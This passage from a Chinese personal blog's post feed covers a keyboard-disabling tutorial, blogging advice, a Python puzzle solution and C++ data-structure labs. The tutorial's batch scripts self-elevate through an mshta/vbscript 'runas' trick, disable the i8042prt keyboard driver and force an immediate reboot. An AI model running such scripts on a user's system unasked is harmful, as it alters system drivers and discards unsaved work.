<p><a class="link"   href="https://blog.csdn.net/qq_44275213/article/details/128543910" >office 提示你的许可证不是正版，你可能是盗版软件的受害者？<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title>如何暂时禁用笔记本自带键盘(附恢复方法)</title>
    <url>/posts/1675f255.html</url>
    <content><![CDATA[<h1 id="如何暂时禁用笔记本自带键盘-附恢复方法"><a href="#如何暂时禁用笔记本自带键盘-附恢复方法" class="headerlink" title="如何暂时禁用笔记本自带键盘(附恢复方法)"></a>如何暂时禁用笔记本自带键盘(附恢复方法)</h1><h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>在我们日常码字中，使用外置机械键盘是很爽的体验，有时候空间较小时我们不得不把键盘摞在笔记本键盘上面，但是由于容易误触，容易按到笔记本键盘按键，这是十分影响体验的</p>
<p>其实可以使用 Windows 批处理来暂时禁用键盘，等到再用的时候再打开</p>
<p>本教程 <span style="color:#FF0000;"> 不需要搭建环境，开袋即食 </span>（除非不是 Windows 系统）</p>
<h2 id="脚本准备"><a href="#脚本准备" class="headerlink" title="脚本准备"></a>脚本准备</h2><h3 id="禁用脚本"><a href="#禁用脚本" class="headerlink" title="禁用脚本"></a>禁用脚本</h3><p>首先新建一个<code>txt</code>文件，命名为 <code>一键禁用笔记本键盘.txt</code></p>
<p>然后打开进行编辑，把下面代码复制进去</p>
<div class="code-container" data-rel="Bat"><figure class="iseeu highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> 提示：计算机将要重启，请保存您的工作！</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line">@<span class="built_in">cd</span>/d&quot;%~dp0&quot;&amp;(<span class="built_in">cacls</span> &quot;<span class="variable">%SystemDrive%</span>\System Volume Information&quot; &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span>)||(<span class="built_in">start</span> &quot;&quot; mshta vbscript:CreateObject^(&quot;Shell.Application&quot;^).ShellExecute^(&quot;%~nx0&quot;,&quot; %*&quot;,&quot;&quot;,&quot;runas&quot;,<span class="number">1</span>^)^(window.close^)&amp;<span class="keyword">exit</span> /b)</span><br><span class="line">sc config i8042prt <span class="built_in">start</span>= disabled</span><br><span class="line">shutdown -r -t <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>保存之后，修改文件后缀为 <code>bat</code></p>
<p>然后按键盘 <code>Ctrl</code>+<code>shift</code>+<code>s</code>，下方编码选择<code>ANSI</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Windows_keyboard/image-20240217192852252.png"
                      alt="image-20240217192852252"
                ></p>
<p>保存之后，就可以用了</p>
<p>注意：此操作需要<span style="color:#FF0000;">重启电脑</span>，请保存好重要文件之后再继续执行，脚本中也内置了提示性语句。确保文件安全</p>
<h3 id="启用脚本"><a href="#启用脚本" class="headerlink" title="启用脚本"></a>启用脚本</h3><p>下面介绍启用脚本代码，要求与上面完全相同，除了代码不同，但也类似</p>
<div class="code-container" data-rel="Bat"><figure class="iseeu highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> 提示：计算机将要重启，请保存您的工作！</span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line">@<span class="built_in">cd</span>/d&quot;%~dp0&quot;&amp;(<span class="built_in">cacls</span> &quot;<span class="variable">%SystemDrive%</span>\System Volume Information&quot; &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span>)||(<span class="built_in">start</span> &quot;&quot; mshta vbscript:CreateObject^(&quot;Shell.Application&quot;^).ShellExecute^(&quot;%~nx0&quot;,&quot; %*&quot;,&quot;&quot;,&quot;runas&quot;,<span class="number">1</span>^)^(window.close^)&amp;<span class="keyword">exit</span> /b)</span><br><span class="line">sc config i8042prt <span class="built_in">start</span>= auto</span><br><span class="line">shutdown -r -t <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="使用演示"><a href="#使用演示" class="headerlink" title="使用演示"></a>使用演示</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Windows_keyboard/image-20240217193145664.png"
                      alt="image-20240217193145664"
                ></p>
<p>内置了提示语句，如果打开之后后悔了，直接点击右上角退出即可</p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>键盘控制</tag>
        <tag>bat批处理</tag>
      </tags>
  </entry>
  <entry>
    <title>如何经营好个人博客</title>
    <url>/posts/d38d49dd.html</url>
    <content><![CDATA[<blockquote>
<p><a class="link"   href="https://tumutanzi.com/archives/12924#/" >https://tumutanzi.com/archives/12924#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h3 id="不要常换网站域名"><a href="#不要常换网站域名" class="headerlink" title="不要常换网站域名"></a>不要常换网站域名</h3><p>不是.com域名？换？域名太长？换？被墙了？换？换来换去，依然不知道自己的域名应该是什么样，搜索引擎不知道，读者也不知道。域名永远是新的。月光博客的域名 williamlong.info 怎么样？我依然记得住，或者根本不用记。就像一个常换手机号的人，你觉得靠谱吗？招牌字号经常换，还能叫“百年老字号”？</p>
<h3 id="不要追求VPS主机"><a href="#不要追求VPS主机" class="headerlink" title="不要追求VPS主机"></a>不要追求VPS主机</h3><p>个人独立博客是个独立网站，需要建立在主机服务器上。建在虚拟主机上还是VPS上？一般的博客完全不必放在VPS上。服务器的安全维护和优化，需要理论技术，还需要花费大量的时间和精力。选择一个好的虚拟主机，把这些事情交给技术人员，会做得更好。</p>
<p>我们最多明白汽车怎么生产就够了，实在感兴趣，可以买一些成型的零件组装一下，但完全不必要买来车床和一堆钢材，自己生产零件，然后再组装成汽车。那样的话，你应该直接去汽车厂。对于博客主机也是一样的道理。除非你特别喜欢折腾服务器，或者是IT从业人员。</p>
<h3 id="不要纠结博客程序"><a href="#不要纠结博客程序" class="headerlink" title="不要纠结博客程序"></a>不要纠结博客程序</h3><p>静态博客程序还是动态博客程序？简单的功能还是复杂的功能？是否支持Markdown？能不能命令行写作？严格意义上来说，无论静态还是动态，两者皆可互换。大众化的WordPress成熟一条龙解决方案有什么不好？广告、评论管理，可简单可复杂，没有什么功能不能实现，就算迁移也无障碍。</p>
<p>很多IT高手们“喜欢”用静态博客生成器建立博客，号称Markdown语法爽翻天，其实博客上就那么几篇日志，记录一下自己搭建的过程，然后就再也没了。居然还问：程序员博客方案哪家强？Ghost，Jekyll，Github Pages，Hexo，弄来弄去都是折腾。事实上，建立一个好博客，不需要那么多功能。</p>
<h3 id="不要折腾博客外观"><a href="#不要折腾博客外观" class="headerlink" title="不要折腾博客外观"></a>不要折腾博客外观</h3><p>内容最重要，外观不是那么重要，简洁就好，又快又突出重点内容。折腾过去折腾过来的换皮，其实也只有博主自己最重视这张皮。忠实的读者也许使用RSS订阅，根本看不到你折腾的主题外观。没有好的内容，再酷的外观都是渣，有好的内容，就是白纸黑字的界面也是赞。</p>
<h3 id="不要盯着广告收入"><a href="#不要盯着广告收入" class="headerlink" title="不要盯着广告收入"></a>不要盯着广告收入</h3><p>博客早期流量一般不高，自然也不会有看得见的广告收入。虽然早期也可以投放，但不要期望有可观的收入。有了每天1,000个访客以后，广告收入自然会上来。死死地盯着广告收入，不但得不到，反而耽误写作好的内容。何况，博客的意义与收获又岂止这点广告收入？</p>
<h3 id="不要限制写作话题"><a href="#不要限制写作话题" class="headerlink" title="不要限制写作话题"></a>不要限制写作话题</h3><p>什么都可以写，博主是个活生生的人，每个人都是多方面的，在博客里记录自己的故事就好。你不可能只懂一方面，如果你只钻研某一方面，总会有一天写得想吐，你的读者也会看得想吐。你本身的复杂多样可以让博客也丰富多彩。</p>
<h3 id="不要担心写作技巧"><a href="#不要担心写作技巧" class="headerlink" title="不要担心写作技巧"></a>不要担心写作技巧</h3><p>在能写好博客之前永远是写不好。只有写了，才会发现越来越容易写。关于写作手法，博客不是作文，不是公务员考试中的申论。其实，真实的思想表述不需要太多的技巧。</p>
<p>你若是一个严肃的人，想方设法抖出来机灵一点都不搞笑。你是什么样的人，就用什么样的语言，把事情和意思准确、干净地表达出来，这就是写作最基本也是最重要的要求。</p>
<h3 id="内容与坚持是王道"><a href="#内容与坚持是王道" class="headerlink" title="内容与坚持是王道"></a>内容与坚持是王道</h3><p>换域名，换空间，换程序，换主题，SEO推广，清除博客，重新再来，最终不再博客，只得一声叹息：原来我也博客过。大多数人在折腾怎么搭博客，很少有人坚持写博客，坚持创造好的内容。</p>
<p>创建一个好Blog，当好一名Blogger，只有坚持创作好的内容才是王道。为什么要经营好自己的博客？无论互联网怎么变，独立个人博客是真正属于你自己的网络空间，博客久了，自会明白。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>子数整数</title>
    <url>/posts/7f4b2896.html</url>
    <content><![CDATA[<h1 id="子数整数"><a href="#子数整数" class="headerlink" title="子数整数"></a>子数整数</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>对于一个五位数 $\overline{a_1a_2a_3a_4a_5}$，可将其拆分为三个子数：</p>
<p>$sub_1&#x3D;\overline{a_1a_2a_3}$</p>
<p>$sub_2&#x3D;\overline{a_2a_3a_4}$</p>
<p>$sub_3&#x3D;\overline{a_3a_4a_5}$</p>
<p>例如，五位数 $20207$ 可以拆分成</p>
<p>$sub_1&#x3D;202$</p>
<p>$sub_2&#x3D;020\ (&#x3D;20)$</p>
<p>$sub_3&#x3D;207$</p>
<p>现在给定一个正整数 $K$，要求你编程求出 $10000$ 到 $30000$ 之间所有满足下述条件的五位数，条件是这些五位数的三个子数 $sub_1,sub_2,sub_3$ 都可被 $K$ 整除。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一个正整数 $K$。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>每一行为一个满足条件的五位数，要求从小到大输出。不得重复输出或遗漏。如果无解，则输出 <code>No</code>。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">22555</span><br><span class="line">25555</span><br><span class="line">28555</span><br><span class="line">30000</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>$0&lt;K&lt;1000$</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">k = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>, <span class="number">30001</span>):</span><br><span class="line">    w = i // <span class="number">10000</span></span><br><span class="line">    q = (i - <span class="number">10000</span> * w) // <span class="number">1000</span></span><br><span class="line">    b = (i - <span class="number">10000</span> * w - <span class="number">1000</span> * q) // <span class="number">100</span></span><br><span class="line">    s = (i - <span class="number">10000</span> * w - <span class="number">1000</span> * q - <span class="number">100</span> * b) // <span class="number">10</span></span><br><span class="line">    g = i - <span class="number">10000</span> * w - <span class="number">1000</span> * q - <span class="number">100</span> * b - <span class="number">10</span> * s</span><br><span class="line">    sub1 = <span class="number">100</span> * w + <span class="number">10</span> * q + <span class="number">1</span> * b</span><br><span class="line">    sub2 = <span class="number">100</span> * q + <span class="number">10</span> * b + <span class="number">1</span> * s</span><br><span class="line">    sub3 = <span class="number">100</span> * b + <span class="number">10</span> * s + <span class="number">1</span> * g</span><br><span class="line">    <span class="keyword">if</span> (sub1 % k == <span class="number">0</span>) <span class="keyword">and</span> (sub2 % k == <span class="number">0</span>) <span class="keyword">and</span> (sub3 % k == <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>代码其实还可以优化，把 qbsg 的计算方法改一下</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">q = (i % <span class="number">10000</span>) // <span class="number">1000</span></span><br><span class="line">b = (i % <span class="number">1000</span>) // <span class="number">100</span></span><br><span class="line">s = (i % <span class="number">100</span>) // <span class="number">10</span></span><br><span class="line">g = i % <span class="number">10</span></span><br></pre></td></tr></table></figure></div>



<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><blockquote>
<p>来自 ChatGPT</p>
</blockquote>
<p>这段代码的作用是寻找在范围 <code>[10000, 30000]</code> 内的所有满足特定条件的五位数。根据题目描述，这些五位数可以被拆分为三个子数 <code>sub1</code>, <code>sub2</code>, <code>sub3</code>，而且这三个子数都能被输入的整数 <code>K</code> 整除。</p>
<p>代码首先通过 <code>input()</code> 函数获取用户输入的整数 <code>K</code>。然后通过一个循环遍历范围 <code>[10000, 30000]</code> 内的所有五位数。</p>
<p>在循环中，通过整数除法 <code>//</code> 和取余 <code>%</code> 运算符计算了每个五位数的各位数字。这些数字被用于构造三个子数 <code>sub1</code>, <code>sub2</code>, <code>sub3</code>。</p>
<p>接下来，检查每个五位数的三个子数是否都能被 <code>K</code> 整除。如果满足条件，则打印该五位数，并将计数器 <code>count</code> 设为 <code>1</code>，以表示至少有一个五位数满足条件。</p>
<p>循环结束后，检查 <code>count</code> 的值。如果 <code>count</code> 仍然为 <code>0</code>，则说明没有找到满足条件的五位数，输出 “No”。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这题不难，就是取余取整</p>
<p><span style="color:#FF0000;"> 注意 input 要转成 int 型 </span></p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>实验一、顺序存储结构线性表的建立及操作</title>
    <url>/posts/767f4a40.html</url>
    <content><![CDATA[<blockquote>
<p>声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/Fis_1Y1PQhtSsV6Vv8uzbswmKvrW"
                     
                ></p>
<h1 id="代码主体"><a href="#代码主体" class="headerlink" title="代码主体"></a>代码主体</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">struct Student &#123;</span><br><span class="line">    long num;</span><br><span class="line">    char name[10];</span><br><span class="line">    float score;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class ScoreList &#123;</span><br><span class="line">private:</span><br><span class="line">    Student data[100];</span><br><span class="line">    int length;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    ScoreList() &#123;</span><br><span class="line">        length = 5;</span><br><span class="line">        data[0] = &#123; 1001, &quot;张三&quot;, 85 &#125;;</span><br><span class="line">        data[1] = &#123; 1002, &quot;李四&quot;, 90 &#125;;</span><br><span class="line">        data[2] = &#123; 1003, &quot;王五&quot;, 80 &#125;;</span><br><span class="line">        data[3] = &#123; 1004, &quot;赵六&quot;, 95 &#125;;</span><br><span class="line">        data[4] = &#123; 1005, &quot;孙七&quot;, 88 &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void del(long num) &#123;</span><br><span class="line">        for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">            if (data[i].num == num) &#123;</span><br><span class="line">                for (int j = i; j &lt; length - 1; j++) &#123;</span><br><span class="line">                    data[j] = data[j + 1];</span><br><span class="line">                &#125;</span><br><span class="line">                length--;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    void insert(Student stu) &#123;</span><br><span class="line">        int pos = 0;</span><br><span class="line">        while (pos &lt; length &amp;&amp; data[pos].score &gt; stu.score) pos++;</span><br><span class="line">        for (int i = length; i &gt; pos; i--) &#123;</span><br><span class="line">            data[i] = data[i - 1];</span><br><span class="line">        &#125;</span><br><span class="line">        data[pos] = stu;</span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    void output() &#123;</span><br><span class="line">        cout &lt;&lt; &quot;学号\t姓名\t分数&quot; &lt;&lt; endl;</span><br><span class="line">        for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">            cout &lt;&lt; data[i].num &lt;&lt; &quot;\t&quot; &lt;&lt; data[i].name &lt;&lt; &quot;\t&quot; &lt;&lt; data[i].score &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    long a;</span><br><span class="line">    char b[10];</span><br><span class="line">    float c;</span><br><span class="line">    ScoreList list;</span><br><span class="line">    list.output();</span><br><span class="line">    cout &lt;&lt; &quot;删除一个学生，请输入学生学号&quot; &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; a;</span><br><span class="line">    list.del(a);</span><br><span class="line">    list.output();</span><br><span class="line">    cout &lt;&lt; &quot;插入一个新学生（学号 姓名 分数 ）用空格隔开&quot; &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    Student newStu = &#123; a, &quot;&quot;, c &#125;;</span><br><span class="line">    strcpy_s(newStu.name, b); // 使用 strcpy 函数复制字符串</span><br><span class="line">    list.insert(newStu);</span><br><span class="line">    list.output();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>实验七 最小生成树和最短路径的实现</title>
    <url>/posts/1b9cb669.html</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/Fv5QkbY1G5LDg_28R1J8Oief5nmC"
                      alt="Fv5QkbY1G5LDg_28R1J8Oief5nmC"
                ></p>
<h1 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h1><blockquote>
<p>没听课（）教材代码，复制过来了</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/******************************* </span></span><br><span class="line"><span class="comment">   对应教材6.4.1节，Prim算法 </span></span><br><span class="line"><span class="comment">********************************/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxSize = <span class="number">10</span>;                   <span class="comment">//图中最多顶点个数</span></span><br><span class="line"><span class="type">int</span> visited[MaxSize] = &#123;<span class="number">0</span>&#125;;              <span class="comment">//全局数组变量visited初始化</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MGraph</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   	<span class="built_in">MGraph</span>(DataType a[ ], <span class="type">int</span> n, <span class="type">int</span> e);     <span class="comment">//构造函数，建立具有n个顶点e条边的图</span></span><br><span class="line">   	~<span class="built_in">MGraph</span>( )&#123; &#125;;                        <span class="comment">//析构函数</span></span><br><span class="line"> 	<span class="function"><span class="type">void</span> <span class="title">Prim</span><span class="params">(<span class="type">int</span> v)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DataType vertex[MaxSize];           <span class="comment">//存放图中顶点的数组</span></span><br><span class="line">    <span class="type">int</span> edge[MaxSize][MaxSize];           <span class="comment">//存放图中边的数组</span></span><br><span class="line">    <span class="type">int</span> vertexNum, edgeNum;              <span class="comment">//图的顶点数和边数</span></span><br><span class="line"></span><br><span class="line"> 	<span class="function"><span class="type">int</span> <span class="title">MinEdge</span><span class="params">(<span class="type">int</span> r[ ], <span class="type">int</span> n)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">MGraph&lt;DataType&gt; :: <span class="built_in">MGraph</span>(DataType a[ ], <span class="type">int</span> n, <span class="type">int</span> e) </span><br><span class="line">&#123;</span><br><span class="line">   	<span class="type">int</span> i, j, k, w;</span><br><span class="line">   	vertexNum = n; edgeNum = e;</span><br><span class="line">   	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vertexNum; i++)          <span class="comment">//存储顶点</span></span><br><span class="line">   		vertex[i] = a[i];</span><br><span class="line">   	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vertexNum; i++)          <span class="comment">//初始化邻接矩阵</span></span><br><span class="line"> 		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; vertexNum; j++)</span><br><span class="line">   			<span class="keyword">if</span> (i == j)</span><br><span class="line">			   edge[i][j] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			   edge[i][j] = <span class="number">100</span>;               <span class="comment">//假设边上权的最大值是100             </span></span><br><span class="line">   	<span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; edgeNum; k++)           <span class="comment">//依次输入每一条边</span></span><br><span class="line">   	&#123;</span><br><span class="line">   		cout &lt;&lt; <span class="string">&quot;请输入边依附的两个顶点的编号，以及边上的权值：&quot;</span>;</span><br><span class="line">		cin &gt;&gt; i &gt;&gt; j &gt;&gt; w;                       <span class="comment">//输入边依附的两个顶点的编号</span></span><br><span class="line">		edge[i][j] = w; edge[j][i] = w;           <span class="comment">//置有边标志</span></span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="type">void</span> MGraph&lt;DataType&gt; :: <span class="built_in">Prim</span>(<span class="type">int</span> v)                           <span class="comment">//从顶点v出发</span></span><br><span class="line">&#123;   </span><br><span class="line">	<span class="type">int</span> i, j, k;</span><br><span class="line">	<span class="type">int</span> adjvex[MaxSize], lowcost[MaxSize];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vertexNum; i++)             <span class="comment">//初始化辅助数组</span></span><br><span class="line">	&#123;</span><br><span class="line">		lowcost[i] = edge[v][i]; adjvex[i] = v;</span><br><span class="line">	&#125;</span><br><span class="line">	lowcost[v] = <span class="number">0</span>;                         <span class="comment">//将顶点v加入集合U</span></span><br><span class="line">	<span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; vertexNum; k++)            <span class="comment">//迭代n-1次</span></span><br><span class="line">	&#123;</span><br><span class="line">		j = <span class="built_in">MinEdge</span>(lowcost, vertexNum);       <span class="comment">//寻找最短边的邻接点j</span></span><br><span class="line">      	cout &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; vertex[j] &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; vertex[adjvex[j]] &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; lowcost[j] &lt;&lt; endl; </span><br><span class="line">		lowcost[j] = <span class="number">0</span>;                       <span class="comment">//顶点j加入集合U</span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vertexNum; i++)          <span class="comment">//调整辅助数组</span></span><br><span class="line">	        <span class="keyword">if</span> (edge[i][j] &lt; lowcost[i]) &#123;</span><br><span class="line">				lowcost[i] = edge[i][j]; </span><br><span class="line">				adjvex[i] = j;</span><br><span class="line">        	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="type">int</span> MGraph&lt;DataType&gt; :: <span class="built_in">MinEdge</span>(<span class="type">int</span> r[ ], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>, min = <span class="number">100</span>;           <span class="comment">//此处如果仅记载最小值下标会有bug </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">		<span class="keyword">if</span> (r[i] != <span class="number">0</span> &amp;&amp; r[i] &lt; min)</span><br><span class="line">		&#123;</span><br><span class="line">			min = r[i]; index = i;		</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*测试数据使用教材 图6-16 所示带权无向图， 输入边依次为 </span></span><br><span class="line"><span class="comment">	(0 1 34)(0 2 46)(0 5 19)(1 4 12)(2 3 17)(2 5 25)(3 4 38)(3 5 25)(4 5 26) */</span> </span><br><span class="line">	<span class="type">char</span> ch[ ]=&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>&#125;;       </span><br><span class="line">	MGraph&lt;<span class="type">char</span>&gt; MG&#123;ch, <span class="number">6</span>, <span class="number">9</span>&#125;;             </span><br><span class="line">	MG.<span class="built_in">Prim</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>实验</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>实验三、栈和队列的应用</title>
    <url>/posts/a2945f82.html</url>
    <content><![CDATA[<blockquote>
<p>已完结</p>
<p>声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cyberdownload.anrunlu.net/FruAGRXClw43THvg6TkSyPl_4S3q"
                     
                ></p>
<h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><ol>
<li><strong>顺序栈</strong>：顺序栈是一种基于数组实现的栈。它通过一个数组和一个栈顶指针实现。当有新元素入栈时，将新元素放在数组的末尾，并将栈顶指针向后移动一位。当需要出栈时，直接返回栈顶元素，并将栈顶指针向前移动一位。</li>
<li><strong>链式栈</strong>：链式栈是一种基于链表实现的栈。它通过一个链表和一个头节点实现。当有新元素入栈时，将新元素插入到链表的头部，并更新头节点。当需要出栈时，直接返回头节点所指向的节点，并让头节点指向下一个节点。</li>
<li><strong>循环队列</strong>：循环队列是一种特殊的队列，它在逻辑上是环形的。循环队列使用一个数组和两个指针（一个头指针和一个尾指针）来实现。当元素入队时，尾指针向前移动并添加新元素；当元素出队时，头指针向前移动。当尾指针到达数组的末尾时，它会从数组的开始继续。</li>
<li><strong>链式队列</strong>：链式队列是基于单链表实现的队列。它使用一个单链表和两个指针（一个头指针和一个尾指针）来实现。当元素入队时，新元素被添加到链表的尾部，并更新尾指针；当元素出队时，头部的元素被移除，并更新头指针</li>
</ol>
<h1 id="实验内容和步骤"><a href="#实验内容和步骤" class="headerlink" title="实验内容和步骤"></a>实验内容和步骤</h1><ol>
<li><strong>顺序栈</strong>：<ul>
<li>入栈：将新元素放在数组的末尾，并将栈顶指针向后移动一位。</li>
<li>出栈：返回栈顶元素，并将栈顶指针向前移动一位。</li>
</ul>
</li>
<li><strong>链式栈</strong>：<ul>
<li>入栈：将新元素插入到链表的头部，并更新头节点。</li>
<li>出栈：返回头节点所指向的节点，并让头节点指向下一个节点。</li>
</ul>
</li>
<li><strong>循环队列</strong>：<ul>
<li>入队：尾指针向前移动并添加新元素。</li>
<li>出队：头指针向前移动。当尾指针到达数组的末尾时，它会从数组的开始继续。</li>
</ul>
</li>
